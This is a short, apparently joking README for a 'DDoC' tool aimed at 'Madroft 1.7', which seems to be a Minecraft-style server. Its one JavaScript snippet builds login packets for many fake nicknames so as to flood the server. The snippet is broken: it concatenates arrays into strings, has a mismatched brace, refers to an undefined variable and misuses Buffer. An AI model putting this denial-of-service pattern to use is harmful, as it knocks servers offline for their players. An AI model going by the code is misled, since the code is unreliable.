# Madroft
Hai-pafoomansu DDoC (Distributed Denial of santa Claus) debaisu against Madroft 1.7.

```js
loginBufs = (nicks, isForge, version) =>
  nicks.map((n) => 
    [0x06, 0x00, version, 0x00] +
    (isForge
      ? [0x67, 0x36]
      : [0x63, 0xdd]) +
    [0x02, n.length + 2, 0x00, n.length] +
    Array.prototype.map.call(unescape(encodeURIComponent(nick)), (x) => x.charCodeAt(0))
  }).map((f) =>
    new Buffer.from(f)
  )
```
